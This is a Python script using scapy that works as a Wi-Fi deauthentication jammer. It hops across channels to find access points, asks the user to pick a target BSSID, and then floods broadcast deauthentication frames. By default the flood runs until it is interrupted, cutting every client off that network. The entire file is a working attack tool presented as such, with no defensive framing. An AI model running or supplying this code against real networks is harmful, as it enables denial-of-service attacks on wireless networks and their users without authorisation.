import argparse
import sys
from multiprocessing import Process
import signal
import random
from scapy.all  import *
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

STOP_SNIFF = False #Sniffing flag
HOPER = None #Var to store process that changes the channel
ATACKER = None #Var to store process that sends the packages
NETWORKS = {} #Dictionary to store available accesspoints 
ATTACK_STOP = False

def setArgs():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        '-i',
        '--interface',
        required=True,
        type=str,
        help=('Indicates the interface used to jamm')
    )

    parser.add_argument(
        '-aAp',
        '--allAccesspoints',
        help = ("Acts over all the available acces points"),
        action='store_true'    
    )

    return parser.parse_args()

def channel_hop(interface):
    counterChannel = 1
    while not STOP_SNIFF:
        try:
            channel = random.randrange(1,13)
            os.system("iwconfig %s channel %d" % (interface, counterChannel))
            time.sleep(3)
            if counterChannel <= 12:
                counterChannel+=1
            else :
                counterChannel = 1
        except KeyboardInterrupt:
            break

def stopHopper(m_signal, frame):
    global STOP_SNIFF
    HOPER.terminate()
    HOPER.join()
    STOP_SNIFF = True


def add_network(pckt, known_networks):
    essid = pckt[Dot11Elt].info if '\x00' not in pckt[Dot11Elt].info  and pckt[Dot11Elt].info != '' else 'Hidden SSID'
    bssid = pckt[Dot11].addr3
    channel = int(ord(pckt[Dot11Elt:3].info))
    if bssid not in known_networks:
        known_networks[bssid] = (essid, channel)
        print "{0:5}\t{1:30}\t{2:30}".format(channel, essid, bssid)

def perform_deauth(bssid, client, count):
    pckt =  RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth()
    print("Sending Deauth to %s from %s" % (client, bssid))

    if count == -1: 
        print("Press CTRL+C to quit")
        while not ATTACK_STOP:
            sendp(pckt, iface=ARGS.interface, inter = .1, count=1)
    else:
        sendp(pckt, iface=ARGS.interface, inter = .1, count=count)


def selectBSSID():
    global ATTACKER
    target_accesspoint = raw_input('Enter a BSSID to perform a deauth attack(q to quit): ')
    while target_accesspoint not in NETWORKS:
        if target_accesspoint == 'q': sys.exit(0)
        target_accesspoint = raw_input("BSSID not founded, please verify (q to quit) :") 
    print("Setting interface  %s to channel %d "% (ARGS.interface, NETWORKS[target_accesspoint][1]) ) 
    os.system("iwconfig %s channel %d" % (ARGS.interface, NETWORKS[target_accesspoint][1]) )
    deauth_pckt_count = raw_input("Number of packets to send (default: infinite):") 
    if not deauth_pckt_count: 
        deauth_pckt_count = -1
    else:
        deauth_pckt_count = int(deauth_pckt_count)
    ATTACKER = Process(target = perform_deauth, args=(target_accesspoint, 'FF:FF:FF:FF:FF:FF', deauth_pckt_count))
    ATTACKER.start() 

def main():
    global ARGS
    global NETWORKS
    global HOPER

    ARGS = setArgs()
    
    print("Press CTRL+C to stop sniffing...")
    print("="*100 + '\n{0:5}\t{1:30}\t{2:30}\n'.format('Channel', 'ESSID','BSSID') + '='*100)
    
    HOPER = Process(target= channel_hop, args=(ARGS.interface,) )
    HOPER.start()

    sniff(
        iface = ARGS.interface,
        lfilter = lambda x: (x.haslayer(Dot11Beacon) or x.haslayer(Dot11ProbeResp)), 
        stop_filter= lambda x: (STOP_SNIFF), 
        prn = lambda x: add_network(x, NETWORKS) )
        
    signal.signal(signal.SIGINT, stopHopper) 
   
    selectBSSID() 
     
    signal.signal(signal.SIGINT, exit) 

def exit(m_signal, frame):
    global ATTACK_STOP
    global ATTACKER
    ATTACK_STOP = True
    ATTACKER.terminate()
    ATTACKER.join()

if __name__ == "__main__":
    main()
